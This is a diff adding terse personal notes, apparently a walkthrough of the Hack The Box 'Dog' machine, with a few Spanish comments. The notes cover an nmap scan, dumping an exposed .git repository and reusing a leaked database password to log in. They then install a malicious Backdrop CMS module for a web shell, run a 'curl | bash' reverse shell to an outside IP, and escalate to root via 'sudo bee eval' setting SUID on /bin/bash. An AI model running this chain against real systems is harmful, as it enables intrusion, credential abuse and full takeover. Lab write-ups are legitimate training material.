@@ -1,0 +1,104 @@
+10.129.231.223
+[
+	:::nmap
+				|   10.129.231.223:80/.git/
+
+	 ::: Fuzzing : "http-enum"
+
+			Nmap scan report for dog.htb (10.129.231.223)
+
+			PORT   STATE SERVICE
+			80/tcp open  http
+			|_http-title: Home | Dog
+			| http-robots.txt: 22 disallowed entries (15 shown)
+			| /core/ /profiles/ /README.md /web.config /admin 
+			| /comment/reply /filter/tips /node/add /search /user/register 
+			|_/user/password /user/login /user/logout /?q=admin /?q=comment/reply
+			| http-git: 
+			|   10.129.231.223:80/.git/
+			|     Git repository found!
+
+	::: mkdir dump && cd dump && virtualenv env
+	::: source ./env/bin/activate
+	::: pip3 install git-dumper
+
+	::: git-dumper http://dog.htb/ .
+	 :: git-dumper http://dog.htb/ ./dump
+
+	::: dump/settings.php 
+													$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
+
+	::: grep -r "\.htb" ./dump/							(vim::  i_Ctrl-r-= trim(system('grep -r "\.htb" ./dump/')))
+
+				./dump/files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json:        "tiffany@dog.htb"	
+
+                "tiffany@dog.htb"
+
+	::: http://dog.htb/?q=user/login
+								User:			tiffany
+								Password: BackDropJ2024DS2024
+
+	 :: http://dog.htb/?q=admin/modules/install
+	 :: http://dog.htb/?q=admin/installer/manual			">Manual Installation"
+
+	::: firefox --search "backdrop cms modules csrf"
+
+	 :: https://github.com/V1n1v131r4/CSRF-to-RCE-on-Backdrop-CMS
+	 :: wget https://github.com/V1n1v131r4/CSRF-to-RCE-on-Backdrop-CMS/releases/download/backdrop/reference.tar
+
+	::: firefox -> http://dog.htb/?q=admin/installer/manual
+
+	::: firefox -> http://dog.htb/modules/reference/shell.php?cmd=id
+
+	::: touch index.html
+
+								#!/bin/bash
+								bash -i >& /dev/tcp/10.10.15.65/443 0>&1
+
+	::: python3 -m http.server 80
+
+	::: nc -nlvp 443
+
+	::: firefox -> http://dog.htb/modules/reference/shell.php?cmd=curl 10.10.15.65 | bash       "un script esta limpiando los modulos instalados despues de x segundos, vuelve a instalar si no funciona"
+
+	trgd::: script /dev/null -c bash
+	trgd::: Ctrl-z
+	::: stty raw -echo; fg
+	trgd::: export TERM=xterm
+	trgd::: export SHELL=/bin/bash
+	::: stty size
+	trgd::: stty rows 57 columns 236
+
+
+	trgd::: su johncusack
+	   psswrd:: BackDropJ2024DS2024
+
+	### johncusack : BackDropJ2024DS2024 
+	 ::: sudo -l
+
+					User johncusack may run the following commands on dog:
+					(ALL : ALL) /usr/local/bin/bee 
+
+   ::: which bee | xargs ls -lah
+
+				lrwxrwxrwx 1 root root 26 Jul  9  2024 /usr/local/bin/bee -> /backdrop_tool/bee/bee.php
+
+	 ::: sudo bee --root=/var/www/html eval "system('whoami');"
+
+	 ::: sudo bee --root=/var/www/html eval "system('chmod u+s /bin/bash');"
+
+	 ::: bash -p
+
+	ROOT:::...<3 <3 <3
+
+]
+
+{[
+	:::
+	 ::
+
+	### user_targed : password 
+	 user_targed:::
+
+	ROOT:::...?
+]}
